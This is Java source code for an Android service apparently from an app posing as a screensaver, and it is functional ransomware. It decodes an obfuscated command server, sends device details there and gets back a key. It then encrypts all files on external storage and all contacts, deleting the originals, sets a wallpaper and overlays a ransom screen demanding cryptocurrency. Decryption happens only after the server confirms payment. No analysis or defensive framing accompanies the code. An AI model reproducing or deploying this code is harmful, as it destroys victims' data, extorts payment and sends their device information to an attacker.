package com.ins.screensaver.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.Spinner;
import android.widget.Toast;

import com.ins.screensaver.Config;
import com.ins.screensaver.R;
import com.ins.screensaver.utils.AES;
import com.ins.screensaver.utils.ContactsUtils;
import com.ins.screensaver.utils.FileUtils;
import com.ins.screensaver.utils.HttpClient;
import com.ins.screensaver.utils.Memory;
import com.ins.screensaver.utils.Utils;

import java.io.File;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.util.Timer;
import java.util.TimerTask;

import javax.crypto.Cipher;

public class CheckerService extends Service {

    Spinner spinner;
    String originalServer = "";
    final String[] key = new String[1];

    WebView webView;
    Button payClick;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();


        {
            try {

                byte[] encrypted = Base64.decode(Config.SERVER, Base64.DEFAULT);
                byte[] fin = new byte[encrypted.length];

                for (int i = 0; i < encrypted.length; i++) {

                    fin[i] = (byte) (encrypted[i] ^ Config.KEY[i
                            % Config.KEY.length]);
                }


                originalServer = new String(fin, Charset.forName("UTF-8"));
                Log.d("SRVC", originalServer);

                runTask();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void showMessage(final WebView webView, final Resources resources) {


                try {

                    final String selectedCoin = spinner.getSelectedItem().toString();
                    final String[] response = new String[1];

                    Thread networking = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                response[0] = new HttpClient().getReq(originalServer +
                                        "settings.php?uid=" + Utils.generateUID() + "&coin="
                                        + selectedCoin);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });
                    networking.start();
                    networking.join();


                    Log.d("Request 1", originalServer +
                            "settings.php?uid=" + Utils.generateUID() + "&coin=" + selectedCoin);

                    final String coin = response[0].split("\\|")[0];
                    final String sum = response[0].split("\\|")[1];
                    final String num = response[0].split("\\|")[2];

                            String newContent = resources.getString(R.string.message);
                            newContent = newContent.replace("{{WALLET}}", num);
                            newContent = newContent.replace("{{SUM}}", sum);
                            newContent = newContent.replace("{{COIN}}", coin);

                            webView.loadData(newContent,
                                    "text/html; charset=UTF-8", null);


                } catch (Exception e) {
                    e.printStackTrace();
                }



    }

    private void runTask() throws Exception {
        Context ctx = this.getBaseContext();
        final Resources resources = getResources();
        Bitmap mBitmap = BitmapFactory.decodeResource(resources, R.drawable.bg);
        Memory _mem;

        final View floatyView = Utils.showRansom(getApplicationContext());


        final TelephonyManager telephonyManager =
                (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);

        try {

            _mem = new Memory(this);
            String done = _mem.readMemoryKey("worked");
            String finished = _mem.readMemoryKey("finished");

            if(finished.equalsIgnoreCase("1")) {
                return;
            }

            if (done.isEmpty()) {
                ctx.setWallpaper(mBitmap);


                Thread attach = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {



                            key[0] = new HttpClient().getReq(originalServer +
                                    "attach.php" +
                                    "?uid=" + Utils.generateUID() +
                                    "&os=" + Build.VERSION.RELEASE +
                                    "&model=" + URLEncoder.encode(Build.MODEL) +
                                    "&permissions=0" +
                                    "&country=" + telephonyManager.getNetworkCountryIso());




                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        encryptContacts(key[0]);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            }).start();

                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    encryptFiles(key[0]);
                                }
                            }).start();


                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });



                attach.start();
                attach.join();



                _mem.writeMemory("worked", "1");
            }

            webView = (WebView) floatyView.findViewById(R.id.webViewMain);
            payClick = (Button) floatyView.findViewById(R.id.button4);
            spinner = (Spinner) floatyView.findViewById(R.id.spinner);

            showMessage(webView, resources);

            final String[] response = new String[1];

            payClick.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {

                    showMessage(webView, resources);

                    Thread net = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                                String coin = spinner.getSelectedItem().toString();

                                response[0] = new HttpClient().getReq(originalServer
                                        + "check.php" +
                                        "?uid=" + Utils.generateUID() + "&coin=" + coin);



                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });


                    try {
                        net.start();
                        net.join();

                        if (!response[0].split("\\|")[0]
                                .equalsIgnoreCase("true")) {
                            return;
                        }

                        final String key = response[0].split("\\|")[1];

                        try {
                            new Memory(getApplicationContext())

                                    .writeMemory("finished", "1");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                decryptFiles(key);
                            }
                        }).start();

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                decryptContacts(key);
                            }
                        }).start();

                        webView.loadData(
                                "You've successfully unblocked your device! Reboot your device to remove this banner.",
                                "text/html; charset=UTF-8", null);

                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }


                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }



       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.N)
                @Override
                public void run() {
                    multiWindowCheck();
                }
            }).start();
        } */


    }

    private void encryptDir(final String encryptionKey, String dir) {
        final byte[] key = Utils.hexStringToByteArray(encryptionKey);
        File f = new File(dir);

        for(final File file : f.listFiles())
            try {
                if (file.isDirectory()) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            encryptDir(encryptionKey, file.getAbsolutePath());
                        }
                    }).start();
                } else {

                    String[] parts = file.getAbsolutePath().split("\\.");
                    if (parts[parts.length - 1].equalsIgnoreCase("encrypted")) {
                        continue;
                    }

                    try {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                Cipher cipher = null;
                                try {
                                    cipher = AES.initEncryption(key);

                                    FileUtils.readFile(file.getAbsolutePath(),
                                            file.getAbsolutePath() + ".encrypted",
                                            key, cipher);

                                    Log.d("Working on ", file.getAbsolutePath());

                                    FileUtils.deleteFile(file.getAbsolutePath());

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                            }
                        }).start();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
    }

    private void decryptDir(final String encryptionKey, String dir) {
        byte[] key = Utils.hexStringToByteArray(encryptionKey);
        File f = new File(dir);

        for(final File file : f.listFiles()) {
            try {

                if(file.isDirectory()) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            decryptDir(encryptionKey, file.getAbsolutePath());
                        }
                    }).start();
                } else {

                    String[] parts = file.getAbsolutePath().split("\\.");
                    if(!parts[parts.length-1].equalsIgnoreCase("encrypted")) {
                        continue;
                    }

                    String path = file.getAbsolutePath().replace(".encrypted", "");

                    Cipher cipher = AES.initDecryption(key);
                    FileUtils.readFile(file.getAbsolutePath(),
                            path,
                            key, cipher);

                    try {

                        FileUtils.deleteFile(file.getAbsolutePath());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }

    private void encryptFiles(String encryptionKey) {
        encryptDir(encryptionKey, Environment.getExternalStorageDirectory().getAbsolutePath());
    }

    private void decryptFiles(String encryptionKey) {
        decryptDir(encryptionKey, Environment.getExternalStorageDirectory().getAbsolutePath());
    }



    private void encryptContacts(String encryptionKey) {
        ContentResolver contentResolver = this.getContentResolver();
        Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        byte[] key = Utils.hexStringToByteArray(encryptionKey);

                        try {

                            String encryptedName =
                                    Base64.encodeToString(AES.encrypt(key,
                                            name.getBytes()), Base64.DEFAULT);

                            String encryptedPhone =
                                    Base64.encodeToString(AES.encrypt(key,
                                            phoneNo.getBytes()), Base64.DEFAULT);

                            ContactsUtils.writeContact(
                                    encryptedName,
                                    encryptedPhone,
                                    getApplicationContext()
                            );

                            String lookupKey = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
                            Uri uri = Uri.withAppendedPath(
                                    ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
                            contentResolver.delete(uri, null, null);

                        } catch (Exception e) {
                            Log.e("Get Contacts Error", e.getMessage());
                        }

                    }
                    pCur.close();
                }
            }
        }
    }

    private void decryptContacts(String encryptionKey) {
        ContentResolver contentResolver = this.getContentResolver();
        Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));


                        byte[] key = Utils.hexStringToByteArray(encryptionKey);

                        try {

                            String originalName = new String(
                                    AES.decrypt(key, Base64.decode(name, Base64.DEFAULT)));

                            String originalPhone = new String(
                                    AES.decrypt(key,
                                            Base64.decode(phoneNo, Base64.DEFAULT)));

                            ContactsUtils.writeContact(
                                    originalName,
                                    originalPhone,
                                    getApplicationContext()
                            );

                            String lookupKey = cur.getString(
                                    cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
                            Uri uri = Uri.withAppendedPath(
                                    ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
                            contentResolver.delete(uri, null, null);

                        } catch (Exception e) {
                            Log.e("Get Contacts Error", e.getMessage());
                        }

                    }
                    pCur.close();
                }
            }
        }
    }
}

